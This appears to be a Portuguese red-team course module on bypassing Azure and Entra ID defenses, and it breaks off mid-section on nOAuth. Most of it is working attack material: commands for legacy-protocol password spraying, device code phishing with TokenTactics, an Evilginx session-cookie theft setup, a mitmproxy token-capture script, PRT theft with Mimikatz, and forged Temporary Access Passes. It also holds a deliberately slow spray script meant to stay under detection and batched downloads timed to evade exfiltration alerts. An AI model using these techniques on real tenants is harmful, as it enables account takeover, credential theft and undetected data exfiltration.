---
title: "Azure Bypass Defenses"
---

# 05 - Bypass de Defesas Azure (KC4)

## O Gap Está no Design, Não na Quebra

Conditional Access Policies (CAP), MFA, Entra ID Protection e Defender for Cloud Apps são as principais linhas de defesa do Azure. Entender como cada controle funciona internamente revela os gaps — condições que não são verificadas, estados transitórios exploráveis, e endpoints que escapam ao monitoramento. KC4 não é sobre quebrar MFA: é sobre encontrar o caminho de menor resistência que o ambiente já permite por design.

---

## Conditional Access Policies (CAP)

### Como Funciona

CAP funciona em 3 fases: **Signal → Decision → Enforcement**.

```
Usuário tenta acessar recurso
         │
         ▼
┌─────────────────────────────────────────────┐
│              SIGNALS (entradas)              │
│  - Identidade: usuário, grupo, role, SP     │
│  - Localização: IP, named location, país    │
│  - Dispositivo: compliant, hybrid-joined    │
│  - Aplicação: client app, cloud app         │
│  - Risco: sign-in risk, user risk (IDP)     │
│  - Sessão: frequência, persistent browser   │
└─────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────┐
│              DECISION (avaliação)            │
│  Avalia TODAS as policies aplicáveis        │
│  Resultado = mais restritivo de todas       │
│  Block > MFA > Compliant > Grant            │
└─────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────┐
│           ENFORCEMENT (controles)            │
│  - Block: acesso negado                     │
│  - Grant: Grant com condições               │
│    * MFA required                           │
│    * Device compliant required              │
│    * Hybrid Azure AD joined required        │
│    * App protection policy required         │
│    * Authentication strength required       │
│  - Session: sign-in frequency, persistent   │
└─────────────────────────────────────────────┘
```

### Enumeração de CAPs

**Método 1: Graph API (requer role)**
```powershell
# Requer: Global Reader, Security Reader, Conditional Access Administrator
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
$headers = @{ Authorization = "Bearer $token" }

$caps = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" `
    -Headers $headers -Method GET

$caps.value | ForEach-Object {
    Write-Host "=== $($_.displayName) ==="
    Write-Host "State: $($_.state)"
    Write-Host "Conditions: $($_.conditions | ConvertTo-Json -Depth 5)"
    Write-Host "Grant Controls: $($_.grantControls | ConvertTo-Json)"
}
```

**Método 2: AAD Graph 1.61-internal (qualquer usuário autenticado)**
```powershell
# Funciona com QUALQUER token de usuário — não gera audit log
$token = "<access_token_qualquer_usuario>"
$headers = @{ Authorization = "Bearer $token" }

# Endpoint interno usado por ROADtools e AADInternals
$url = "https://graph.windows.net/myorganization/conditionalAccessPolicies?api-version=1.61-internal"

$caps = Invoke-RestMethod -Uri $url -Headers $headers -Method GET
$caps.value | Select-Object displayName, state, conditions, grantControls
```

**Via AADInternals**
```powershell
Import-Module AADInternals

# Obter token
$token = Get-AADIntAccessTokenForAADGraph

# Listar CAPs
Get-AADIntConditionalAccessPolicies -AccessToken $token | Format-List
```

**Via ROADtools**
```bash
# Autenticar
roadrecon auth -u user@tenant.com -p 'Password123!'

# Coletar dados (inclui CAPs)
roadrecon gather

# Visualizar no browser
roadrecon gui
# Navegar para: http://localhost:5000 → Policies → Conditional Access
```

**Via Az CLI**
```bash
# Requer permissão Policy.Read.All
az rest --method GET \
    --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
    --headers "Content-Type=application/json"
```

---

## Bypass Técnica 1: Protocolos de Autenticação Legados

### Por Que Funciona

Protocolos legados (IMAP, POP3, SMTP, Exchange ActiveSync, Basic Auth) não suportam MFA por design. CAPs precisam explicitamente bloquear "Other clients" e "Exchange ActiveSync" — se não o fizerem, bypass é possível.

```
Cliente Legado (Outlook 2010, Thunderbird)
         │
         │ Basic Auth (usuário:senha em Base64)
         ▼
    Exchange Online
         │
         │ NÃO passa pelo fluxo OAuth/OIDC
         │ NÃO suporta MFA challenge
         ▼
    Acesso Concedido
    (se CAP não bloquear explicitamente)
```

### Identificar se Legado Está Habilitado

```powershell
# Via Graph API — verificar se CAP bloqueia legado
$caps | Where-Object {
    $_.conditions.clientAppTypes -contains "exchangeActiveSync" -or
    $_.conditions.clientAppTypes -contains "other"
} | Select-Object displayName, state

# Se nenhuma policy aparece: legado NÃO está bloqueado
```

```bash
# Testar acesso SMTP com credenciais válidas
curl -v --url "smtps://smtp.office365.com:465" \
    --ssl-reqd \
    --mail-from "attacker@external.com" \
    --mail-rcpt "victim@target.com" \
    --user "victim@target.com:Password123"

# Testar IMAP
curl -v --url "imaps://outlook.office365.com:993" \
    --user "victim@target.com:Password123"
```

```python
# Python — autenticar via IMAP (legado)
import imaplib

mail = imaplib.IMAP4_SSL('outlook.office365.com')
result = mail.login('victim@target.com', 'Password123!')
print(result)  # OK se legado habilitado

# Listar caixas
mail.select('INBOX')
typ, msgs = mail.search(None, 'ALL')
print(f"Emails: {len(msgs[0].split())}")
```

### Ferramentas para Spray com Legado

```bash
# MailSniper — spray via legado
Import-Module MailSniper
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList users.txt -Password 'Summer2024!'

# o365spray com módulo legado
python3 o365spray.py --spray --userfile users.txt --password 'Summer2024!' \
    --module imap --domain target.com

# Ruler (Go) — EWS/Autodiscovery
ruler --domain target.com brute --users users.txt --passwords passwords.txt --delay 0
```

---

## Bypass Técnica 2: Named Locations e Trusted IPs

### Como Funciona

CAPs podem confiar em:
- **Named Locations** (faixas IP definidas pelo admin)
- **Compliant Network** (Global Secure Access)
- **MFA Trusted IPs** (legacy — configurado em Per-User MFA)

Se atacante obtém acesso via IP confiável (VPN da empresa, IP de escritório, Azure region) → CAP pode não exigir MFA.

### Enumeração de Named Locations

```powershell
$headers = @{ Authorization = "Bearer $token" }

# Listar Named Locations
$locations = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations" `
    -Headers $headers

$locations.value | ForEach-Object {
    Write-Host "Nome: $($_.displayName)"
    if ($_.ipRanges) {
        Write-Host "IPs: $($_.ipRanges.cidrAddress -join ', ')"
    }
    Write-Host "isTrusted: $($_.isTrusted)"
}
```

### Identificar IP de Saída Corporativo

```bash
# Via SPF records do domínio alvo
dig TXT target.com | grep spf
# Retorna IPs que enviam email — frequentemente mesmo range que usuários

# Via MX e autodiscover
dig MX target.com
dig A autodiscover.target.com

# Via Certificate Transparency (subdomínios que podem indicar VPN/proxies)
curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u
```

### Explorar com IP Confiável

```bash
# Se atacante está em rede confiável (VPN comprometida, lateral movement)
# Autenticar sem MFA challenge
az login -u victim@target.com -p 'Password123!'

# Testar acesso ao Exchange com IP confiável
python3 o365spray.py --validate --username victim@target.com \
    --password 'Password123!' --domain target.com
```

---

## Bypass Técnica 3: Device Code Phishing (MFA Bypass por Design)

### Por Que é Bypass

Device Code Phishing não "quebra" MFA — faz a **vítima completar MFA**. Atacante recebe token pós-MFA. CAPs que exigem MFA são completamente satisfeitas porque MFA foi completada pelo usuário legítimo.

```
ATACANTE                    VÍTIMA
    │                          │
    │ POST /oauth2/v2.0/devicecode
    ├──────────────────────────►│ (solicita device code)
    │                          │
    │◄── device_code, user_code┤
    │                          │
    │  Envia user_code via     │
    │  phishing/social eng     │
    ├──────────────────────────►│
    │                          │
    │  Polling /token...       │  Acessa microsoft.com/devicelogin
    │                          │  Insere user_code
    │                          │  Completa MFA (SMS, Authenticator)
    │                          │
    │◄── access_token ─────────┤ (MS retorna token ao atacante)
    │    refresh_token         │
    │    id_token              │
```

```powershell
# TokenTactics — Device Code Phishing completo
Import-Module TokenTactics

# Iniciar phishing (copiar user_code e enviar para vítima)
$response = Invoke-DeviceCodePhishing

# Aguardar vítima completar autenticação
# Token retorna automaticamente após vítima completar MFA

# Usar refresh token para obter outros tokens (FOCI)
$msGraphToken = Invoke-RefreshToMSGraphToken -RefreshToken $response.refresh_token -Domain "target.com"
$azureToken = Invoke-RefreshToAzureManagementToken -RefreshToken $response.refresh_token -Domain "target.com"
$sharepointToken = Invoke-RefreshToSharePointToken -RefreshToken $response.refresh_token -Domain "target.com"
```

**Por que funciona contra CAP com MFA obrigatório:**
- Sinal de MFA: `✓` (vítima completou MFA)
- Sinal de dispositivo: depende — se CAP exige compliant device, token ainda pode ser bloqueado
- Sinal de localização: IP da vítima durante autenticação satisfaz, token não carrega IP

---

## Bypass Técnica 4: AiTM — Session Cookie Theft

### Por Que Funciona

CAP valida no momento da autenticação. Após emitir session cookie, validações periódicas dependem de **CAE (Continuous Access Evaluation)**. Sem CAE, token válido por até 1h sem re-validação.

```
VÍTIMA          PROXY ATACANTE (Evilginx3)      MICROSOFT
  │                      │                          │
  │──HTTP Request────────►│                          │
  │                      │──Forward Request─────────►│
  │                      │◄─MFA Challenge────────────│
  │◄─MFA Challenge───────│                          │
  │──MFA Response────────►│                          │
  │                      │──Forward MFA─────────────►│
  │                      │◄─Session Cookie───────────│
  │                      │  (atacante CAPTURA cookie)│
  │◄─Session Cookie───────│                          │
  │  (vítima também recebe│                          │
  │   cookie legítimo)    │                          │
```

```bash
# Evilginx3 — setup para Microsoft 365
# Instalar
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && go build

# Configurar phishlet Microsoft
./evilginx -p ./phishlets -developer

# No console Evilginx:
phishlets hostname microsoft seu-dominio-phishing.com
phishlets enable microsoft
lures create microsoft
lures get-url 0

# Monitorar sessões capturadas
sessions

# Ver cookies de sessão (após vítima autenticar)
sessions 1
# Copiar cookies e importar no browser do atacante
```

```python
# mitmdump — SSL interception para capturar tokens
# (requer MITM posição na rede ou proxy configurado)
from mitmproxy import http
import json, re

TOKEN_PATTERN = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

def response(flow: http.HTTPFlow):
    body = flow.response.text if flow.response else ""
    tokens = TOKEN_PATTERN.findall(body)
    for t in tokens:
        with open('/tmp/captured_tokens.txt', 'a') as f:
            f.write(f"URL: {flow.request.url}\nToken: {t}\n---\n")
```

```bash
# Executar mitmdump
mitmdump -s /tmp/capture_tokens.py --listen-port 8080 \
    --ssl-insecure 2>/dev/null
```

---

## Bypass Técnica 5: Primary Refresh Token (PRT)

### O Que é PRT

PRT é emitido para dispositivos Azure AD Joined/Hybrid Joined. Permite SSO sem re-autenticação. Satisfaz CAPs que exigem "device compliant" porque o PRT está vinculado a um dispositivo registrado.

```
Dispositivo AD Joined
         │
         │ PRT (Primary Refresh Token)
         │ - Vinculado ao dispositivo
         │ - Satisfaz MFA claim
         │ - Satisfaz device compliance (se dispositivo é compliant)
         │ - Válido por 14 dias (renovável)
         ▼
    Windows WAM (Web Account Manager)
         │
         │ Usa PRT para obter access tokens transparentemente
         ▼
    Apps acessam recursos sem prompt de login
```

### Roubo de PRT

```powershell
# ROADtoken — extrair PRT do dispositivo comprometido
# https://github.com/dirkjanm/ROADtoken

# No dispositivo comprometido (requer SYSTEM ou usuário logado)
.\ROADtoken.exe

# Saída inclui:
# - PRT
# - Session key (necessária para uso do PRT)
# - Device ID
```

```powershell
# Mimikatz — extrair PRT via LSASS
# (requer admin local)
privilege::debug
sekurlsa::cloudap

# Procurar por:
# * Primary Refresh Token *
# PRT: <base64>
# Context: <hex>
```

```powershell
# AADInternals — usar PRT roubado para obter tokens
Import-Module AADInternals

# Obter token usando PRT
$token = Get-AADIntAccessTokenWithPRT -PRTToken "<prt_value>" `
    -SessionKey "<session_key>" `
    -Resource "https://graph.microsoft.com/"

# PRT satisfaz device compliance claim em CAPs
# Tokens obtidos via PRT herdam claims de dispositivo
```

```python
# requesttoken.py (ROADtools) — usar PRT
from roadtools.roadlib.auth import Authentication

auth = Authentication()
auth.set_client_id('04b07795-8ddb-461a-bbee-02f9e1bf7b46')  # Az CLI

# Usar PRT para autenticar
token = auth.authenticate_with_prt('<prt>', '<session_key>')
print(token['access_token'])
```

---

## Bypass Técnica 6: Temporary Access Pass (TAP)

### TAP como Bypass de MFA

TAP é um passcode temporário que satisfaz requisitos de MFA em CAPs. Abuse em dois cenários:

**Cenário A: Atacante tem acesso a criar TAP (User Administrator)**
```powershell
# Criar TAP para usuário alvo
$headers = @{ Authorization = "Bearer $token" }
$body = @{
    isUsableOnce = $false
    lifetimeInMinutes = 480
} | ConvertTo-Json

$tap = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/users/victim@target.com/authentication/temporaryAccessPassMethods" `
    -Method POST `
    -Headers $headers `
    -Body $body `
    -ContentType "application/json"

Write-Host "TAP criado: $($tap.temporaryAccessPass)"
# Usar TAP para autenticar como vítima sem precisar de MFA real
```

**Cenário B: TAP Bug — Token outlives policy**
```
CAP Policy: TAP session limited to 10 minutes
ARM Access Token obtained via TAP: valid 70-75 minutes

Sequência do bug:
1. Atacante usa TAP para autenticar no Azure portal
2. ARM Access Token emitido (lifetime: ~70-75 min)
3. TAP policy diz: sessão expira em 10 min
4. Portal pode forçar re-auth após 10 min
5. MAS: access token obtido durante esses 10 min continua válido por ~70-75 min
6. Atacante usa token diretamente via API — bypass da limitação de sessão

Impacto: Mesmo com TAP configurado para 10 minutos,
acesso via token persiste por até 75 minutos.
```

```powershell
# Demonstração do TAP Bug
# 1. Autenticar com TAP
az login --allow-no-subscriptions  # Usar TAP como senha quando solicitado

# 2. Capturar token ARM imediatamente
$armToken = (az account get-access-token --resource "https://management.azure.com/" | ConvertFrom-Json).accessToken

# 3. Decodificar e verificar exp
$payload = $armToken.Split('.')[1]
$padded = $payload + ('=' * (4 - $payload.Length % 4))
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($padded))
$claims = $decoded | ConvertFrom-Json

$exp = [DateTimeOffset]::FromUnixTimeSeconds($claims.exp)
$iat = [DateTimeOffset]::FromUnixTimeSeconds($claims.iat)
Write-Host "Emitido: $iat"
Write-Host "Expira: $exp"
Write-Host "Duração: $(($exp - $iat).TotalMinutes) minutos"
# Mostra ~70-75 minutos independente do TAP policy de 10 min

# 4. Usar token mesmo após "sessão" expirar
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" `
    -Headers @{ Authorization = "Bearer $armToken" }
```

---

## Bypass Técnica 7: Authentication Strength Downgrade

### Níveis de Authentication Strength

```
Nível 1 — Multifactor authentication (mais fraco)
├── Password + SMS
├── Password + Voice call
├── Password + Microsoft Authenticator push
├── Password + OATH TOTP
└── Temporary Access Pass (TAP)

Nível 2 — Passwordless MFA
├── Microsoft Authenticator (passwordless)
├── FIDO2 security key
└── Windows Hello for Business (WHfB)

Nível 3 — Phishing-resistant MFA (mais forte)
├── FIDO2 security key
├── Windows Hello for Business (WHfB)
└── Certificate-Based Authentication (CBA)
```

### CBA (Certificate-Based Authentication) Abuse

CBA é considerado "phishing-resistant" mas depende de onde o certificado está armazenado:

```powershell
# Localizar certificados de identidade no ambiente comprometido

# 1. Key Vaults — certificados armazenados
$kvs = az keyvault list | ConvertFrom-Json
foreach ($kv in $kvs) {
    $certs = az keyvault certificate list --vault-name $kv.name | ConvertFrom-Json
    if ($certs.Count -gt 0) {
        Write-Host "Key Vault: $($kv.name)"
        $certs | Select-Object name, id
    }
}

# 2. Storage Accounts — PFX arquivos
$accounts = az storage account list | ConvertFrom-Json
foreach ($acc in $accounts) {
    $key = az storage account keys list --account-name $acc.name | ConvertFrom-Json
    $containers = az storage container list --account-name $acc.name `
        --account-key $key[0].value | ConvertFrom-Json
    # Procurar PFX, CER, CRT, KEY nos containers
    foreach ($c in $containers) {
        az storage blob list --account-name $acc.name `
            --container-name $c.name --account-key $key[0].value | ConvertFrom-Json | 
            Where-Object { $_.name -match '\.(pfx|cer|crt|p12)$' }
    }
}

# 3. Automation Accounts — certificados de conexão
$automationAccounts = az automation account list | ConvertFrom-Json
foreach ($aa in $automationAccounts) {
    az automation certificate list `
        --automation-account-name $aa.name `
        --resource-group $aa.resourceGroup | ConvertFrom-Json |
        Select-Object name, thumbprint, expiryTime
}
```

```powershell
# Baixar e usar certificado de Key Vault para CBA
# Requer permissão: Key Vault Certificate Officer ou Get

# Download do certificado (formato PFX)
az keyvault secret download `
    --vault-name "target-kv" `
    --name "identity-cert" `
    --file "/tmp/identity.pfx" `
    --encoding base64

# Usar certificado para autenticar via CBA
Connect-MgGraph -ClientId "<app_client_id>" `
    -TenantId "<tenant_id>" `
    -CertificatePath "/tmp/identity.pfx"

# Ou via MSAL
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new("/tmp/identity.pfx", "")
Connect-AzAccount -ServicePrincipal `
    -Tenant "<tenant_id>" `
    -ApplicationId "<app_id>" `
    -CertificateThumbprint $cert.Thumbprint
```

---

## Bypass Técnica 8: Entra ID Protection Bypass

### O Que Entra ID Protection Monitora

```
Eventos de Risco Detectados:
├── Anonymous IP address (Tor, VPN conhecida)
├── Atypical travel (login de locais diferentes em curto tempo)
├── Malware linked IP
├── Unfamiliar sign-in properties (novo browser, OS, local)
├── Password spray
├── Leaked credentials (HaveIBeenPwned sync)
├── Suspicious inbox forwarding rule
├── Suspicious browser
└── Token issuer anomaly
```

### Técnicas para Evitar Detecção

**1. Manter consistência com o usuário legítimo**
```bash
# Obter informações sobre o usuário legítimo antes de usar token roubado
# Verificar logs de audit para entender padrões

# Via Graph API — ver sign-in logs do usuário
$signinLogs = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?`$filter=userPrincipalName eq 'victim@target.com'&`$top=10" `
    -Headers @{ Authorization = "Bearer $adminToken" }

$signinLogs.value | Select-Object ipAddress, location, clientAppUsed, appDisplayName

# Identificar:
# - País/cidade de onde usuário normalmente acessa
# - Browser/OS típico
# - Horário de acesso
# - Apps acessados
```

**2. Usar IP do mesmo país/região**
```bash
# Proxies/VPNs no mesmo país do usuário alvo
# Verificar localização do usuário nos logs primeiro
# Usar exit node de VPN comercial no mesmo país

# Serviços úteis para verificar geolocalização de IP
curl "https://ipapi.co/$(curl -s ifconfig.me)/json/" | jq '{country, city, org}'
```

**3. Spray lento para evitar detecção de password spray**
```python
import time
import requests
import random

# Password spray ultra lento — abaixo do threshold de detecção
# Microsoft detecta múltiplas tentativas em curto período

users = open('users.txt').readlines()
password = 'Summer2024!'

for user in users:
    user = user.strip()
    # Delay aleatório entre 30-120 minutos por usuário
    delay = random.randint(1800, 7200)
    
    try:
        # Tentativa de auth
        resp = requests.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            data={
                'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                'scope': 'openid profile offline_access',
                'grant_type': 'password',
                'username': user,
                'password': password
            }
        )
        if resp.status_code == 200:
            print(f"[+] VALID: {user}")
        elif 'AADSTS50126' in resp.text:
            print(f"[-] Invalid credentials: {user}")
        elif 'AADSTS50057' in resp.text:
            print(f"[!] Account disabled: {user}")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    print(f"[*] Waiting {delay//60} minutes...")
    time.sleep(delay)
```

**4. Evasão de Token Issuer Anomaly**
```
Token Issuer Anomaly detecta quando:
- Token claims não correspondem ao que seria esperado
- Token modificado ou forjado

Para evitar:
- Nunca modificar tokens — usar tokens originais
- Se usando FOCI: usar apenas Invoke-RefreshTo* para troca legítima
- Não misturar tokens de diferentes tenants no mesmo contexto
```

---

## Bypass Técnica 9: Defender for Cloud Apps

### O Que MDCA Monitora

```
Microsoft Defender for Cloud Apps (MDCA) monitora:
├── Shadow IT — apps não sancionados detectados via proxy
├── OAuth App Governance — apps com permissões suspeitas
├── Anomaly Detection Policies
│   ├── Activity from infrequent country
│   ├── Activity from anonymous IP addresses
│   ├── Impossible travel
│   ├── Mass download by a single user
│   ├── Ransomware activity
│   └── Suspicious email deletion activity
├── Session Policies — controle em tempo real via proxy reverso
└── Access Policies — controle de acesso baseado em contexto
```

### Gaps e Bypass

**1. MDCA não monitora APIs diretas**
```
MDCA Session Control funciona via proxy reverso (browser).
API calls diretas (PowerShell, Az CLI, Python) NÃO passam pelo proxy.

Browser → MDCA Proxy → Microsoft 365  (monitorado)
Az CLI  → Microsoft 365               (não monitorado pelo proxy)
```

```powershell
# Usar APIs diretamente em vez de browser
# Az CLI, PowerShell, REST — bypass de Session Policies

# Em vez de acessar SharePoint no browser (monitorado):
# Baixar via REST API (não monitorado por Session Policy)
$token = (Get-AzAccessToken -ResourceUrl "https://target.sharepoint.com").Token
$headers = @{ Authorization = "Bearer $token" }

Invoke-RestMethod -Uri "https://target.sharepoint.com/_api/web/lists" `
    -Headers $headers | Select-Object -ExpandProperty value
```

**2. Limitar volume de downloads**
```powershell
# Mass download detection — baixar em lotes pequenos ao longo do tempo
# Em vez de 1000 arquivos de uma vez, baixar 10-20 por hora

$files = @("file1.docx", "file2.xlsx", "file3.pdf")  # lista de alvos
$batchSize = 5

for ($i = 0; $i -lt $files.Count; $i += $batchSize) {
    $batch = $files[$i..([Math]::Min($i + $batchSize - 1, $files.Count - 1))]
    foreach ($file in $batch) {
        # Download
        Invoke-WebRequest -Uri "https://..." -OutFile "/tmp/$file" -Headers $headers
    }
    # Esperar 30-60 min entre lotes
    Start-Sleep -Seconds (Get-Random -Minimum 1800 -Maximum 3600)
}
```

---

## Audit Log Gaps

### Ações Sem Log por Padrão

```
Sem log ou log incompleto:
│
├── AAD Graph 1.61-internal (beta endpoints)
│   └── https://graph.windows.net/.../conditionalAccessPolicies?api-version=1.61-internal
│       → Sem entrada em Audit Logs do Entra ID
│
├── IMDS (Instance Metadata Service)
│   └── http://169.254.169.254/metadata/identity/oauth2/token
│       → Sem log de "token requested" visível no portal
│       → Aparece apenas como "service principal sign-in" nos logs de sign-in
│
├── Token exchanges via FOCI
│   └── Troca de refresh token entre client IDs da família
│       → Aparece como sign-in separado mas com UPN do usuário original
│       → Pode não correlacionar com o acesso inicial
│
├── Leitura de ROADtools via roadrecon
│   └── roadrecon gather usa endpoints legítimos do Graph
│       → Cada chamada aparece como acesso normal ao Graph
│       → Volume alto de chamadas pode indicar enum mas não é alert por padrão
│
├── Read operations no ARM/Graph
│   └── GET requests em geral não geram Audit Log
│       → Apenas writes (POST, PUT, PATCH, DELETE) são logados em Audit
│       → Read de usuários, grupos, aplicações: sem log em Audit
│       → Apenas "Sign-in logs" capturam autenticação, não queries
│
├── Logic Apps — acesso via callback URL
│   └── Trigger via callback URL não requer autenticação
│       → Pode não aparecer em logs de sign-in
│
└── Email no Exchange
    └── Leitura de emails via EWS/Graph sem delegation explícita
        → Requer audit de mailbox habilitado separadamente (não é default)
```

### Verificar Configuração de Audit

```powershell
# Verificar quais categorias de audit estão habilitadas
$headers = @{ Authorization = "Bearer $token" }

# Listar configurações de diagnostic (Log Analytics)
$diagSettings = Invoke-RestMethod `
    -Uri "https://management.azure.com/providers/microsoft.aadiam/diagnosticSettings?api-version=2017-04-01-preview" `
    -Headers $headers

$diagSettings.value | ForEach-Object {
    Write-Host "Workspace: $($_.properties.workspaceId)"
    $_.properties.logs | Where-Object { $_.enabled -eq $true } | 
        Select-Object category, enabled
}

# Categorias importantes:
# AuditLogs — operações em objetos Entra ID
# SignInLogs — autenticações de usuários
# NonInteractiveUserSignInLogs — sign-ins não-interativos (FOCI, service)
# ServicePrincipalSignInLogs — service principal sign-ins (IMDS)
# RiskyUsers — usuários com risco detectado
# UserRiskEvents — eventos de risco
```

```powershell
# Verificar audit de mailbox (Exchange)
# Requer Exchange Admin
Connect-ExchangeOnline -UserPrincipalName admin@target.com

# Verificar se audit está habilitado para usuário específico
Get-Mailbox -Identity "victim@target.com" | Select-Object AuditEnabled, AuditOwner, AuditDelegate, AuditAdmin

# Verificar unified audit log
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) `
    -EndDate (Get-Date) `
    -UserIds "victim@target.com" `
    -Operations "MailItemsAccessed" `
    -ResultSize 100
```

---

## JWT Token — Inspeção e Manipulação

### Estrutura de JWT

```
JWT = Header.Payload.Signature

Header (base64url):
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "key_id"           // Identifica qual chave pública usar para validar
}

Payload (base64url):
{
  "aud": "https://management.azure.com/",   // Resource (audience)
  "iss": "https://sts.windows.net/<tid>/",  // Issuer
  "iat": 1700000000,                        // Issued At
  "nbf": 1700000000,                        // Not Before
  "exp": 1700003600,                        // Expiry (1 hora depois)
  "aio": "...",                             // Internal MS claim
  "appid": "<client_id>",                   // App que solicitou token
  "appidacr": "0",                          // 0=delegated, 1=client_credentials
  "family_name": "Smith",
  "given_name": "John",
  "ipaddr": "203.0.113.42",                // IP de onde foi emitido
  "name": "John Smith",
  "oid": "<user_object_id>",
  "puid": "...",
  "rh": "...",
  "scp": "openid profile User.Read",       // Scopes (delegated)
  "roles": ["Mail.ReadWrite"],              // Roles (application permissions)
  "sub": "<subject>",
  "tid": "<tenant_id>",                    // Tenant
  "unique_name": "john@target.com",
  "upn": "john@target.com",
  "uti": "...",
  "ver": "1.0",
  "wids": ["<role_template_id>"],          // Directory roles do usuário
  "xms_tcdt": 1234567890                   // Tenant creation date
}

Signature: RS256(base64url(Header) + "." + base64url(Payload), private_key)
```

### Decode e Análise de JWT

```bash
# Bash — decode sem verificar assinatura
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6..."

# Extrair e decodificar payload
echo $TOKEN | cut -d'.' -f2 | \
    python3 -c "import sys, base64, json; \
    data = sys.stdin.read().strip(); \
    padding = 4 - len(data) % 4; \
    data += '=' * (padding % 4); \
    print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2))"

# Verificar expiração
echo $TOKEN | cut -d'.' -f2 | \
    python3 -c "
import sys, base64, json, datetime
data = sys.stdin.read().strip()
padding = 4 - len(data) % 4
data += '=' * (padding % 4)
payload = json.loads(base64.urlsafe_b64decode(data))
exp = datetime.datetime.fromtimestamp(payload['exp'])
now = datetime.datetime.now()
print(f'Expires: {exp}')
print(f'Valid: {now < exp}')
print(f'Remaining: {exp - now}')
print(f'Audience: {payload.get(\"aud\")}')
print(f'Scopes: {payload.get(\"scp\")}')
print(f'Roles: {payload.get(\"roles\")}')
print(f'User: {payload.get(\"upn\")}')
print(f'IP: {payload.get(\"ipaddr\")}')
"
```

```powershell
# PowerShell — parse JWT
function Parse-JWTToken {
    param([string]$Token)
    
    $parts = $Token.Split('.')
    $payload = $parts[1]
    
    # Adicionar padding
    $padding = 4 - ($payload.Length % 4)
    if ($padding -lt 4) { $payload += '=' * $padding }
    
    $decoded = [System.Text.Encoding]::UTF8.GetString(
        [Convert]::FromBase64String($payload.Replace('-', '+').Replace('_', '/'))
    )
    
    return $decoded | ConvertFrom-Json
}

$token = "<jwt_token>"
$claims = Parse-JWTToken -Token $token

Write-Host "Usuário: $($claims.upn)"
Write-Host "Tenant: $($claims.tid)"
Write-Host "Resource: $($claims.aud)"
Write-Host "Scopes: $($claims.scp)"
Write-Host "Roles: $($claims.roles)"
Write-Host "Expira: $([DateTimeOffset]::FromUnixTimeSeconds($claims.exp))"
Write-Host "Emitido de IP: $($claims.ipaddr)"

# Verificar se tem MFA claim
if ($claims.amr -contains 'mfa') {
    Write-Host "MFA: Completado"
} else {
    Write-Host "MFA: NÃO completado"
}

# Verificar roles do Entra ID
if ($claims.wids) {
    Write-Host "Directory Roles (wids): $($claims.wids)"
    # Global Admin: 62e90394-69f5-4237-9190-012177145e10
    if ($claims.wids -contains '62e90394-69f5-4237-9190-012177145e10') {
        Write-Host "[!] GLOBAL ADMIN TOKEN"
    }
}
```

```python
# Python — análise completa de token
import base64
import json
import sys
from datetime import datetime

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    payload = parts[1]
    padding = 4 - len(payload) % 4
    payload += '=' * (padding % 4)
    
    decoded = base64.urlsafe_b64decode(payload)
    return json.loads(decoded)

def analyze_token(token):
    claims = decode_jwt(token)
    if not claims:
        print("Invalid JWT")
        return
    
    print("=== JWT Analysis ===")
    print(f"User: {claims.get('upn', claims.get('unique_name', 'N/A'))}")
    print(f"Tenant: {claims.get('tid', 'N/A')}")
    print(f"App ID: {claims.get('appid', 'N/A')}")
    print(f"Audience: {claims.get('aud', 'N/A')}")
    
    exp = datetime.fromtimestamp(claims.get('exp', 0))
    iat = datetime.fromtimestamp(claims.get('iat', 0))
    now = datetime.now()
    
    print(f"Issued at: {iat}")
    print(f"Expires at: {exp}")
    print(f"Valid: {now < exp}")
    if now < exp:
        remaining = exp - now
        print(f"Time remaining: {remaining}")
    
    print(f"\nScopes (delegated): {claims.get('scp', 'N/A')}")
    print(f"Roles (application): {claims.get('roles', 'N/A')}")
    print(f"Auth methods: {claims.get('amr', 'N/A')}")
    print(f"Source IP: {claims.get('ipaddr', 'N/A')}")
    
    # Roles Entra ID
    role_map = {
        '62e90394-69f5-4237-9190-012177145e10': 'Global Administrator',
        'f28a1f50-f6e7-4571-818b-6a12f2af6b6c': 'SharePoint Administrator',
        'fe930be7-5e62-47db-91af-98c3a49a38b1': 'User Administrator',
        '9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3': 'Application Administrator',
        '7be44c8a-adaf-4e2a-84d6-ab2649e08a13': 'Privileged Authentication Administrator',
    }
    
    wids = claims.get('wids', [])
    if wids:
        print("\nDirectory Roles:")
        for wid in wids:
            role_name = role_map.get(wid, f'Unknown ({wid})')
            print(f"  - {role_name}")

# Uso
analyze_token(sys.argv[1] if len(sys.argv) > 1 else input("Token: "))
```

---

## nOAuth — Email Claim Abuse

### Por Que Funciona

O claim `email` em JWTs Microsoft é:
- **Mutável** — usuário pode alterar via perfil
- **Não verificado** — não confirma posse do email
- Muitos apps usam `email` claim como identificador único

```
Atacante tem conta no tenant alvo (ex: guest ou employee)
         │
         │ Alterar email no perfil para: ceo@target.com
         ▼
Autenticar em app terceiro que usa Microsoft OAuth
         │
         │ App recebe JWT com claims:
         │ { "email": "ceo@target.com", ... }
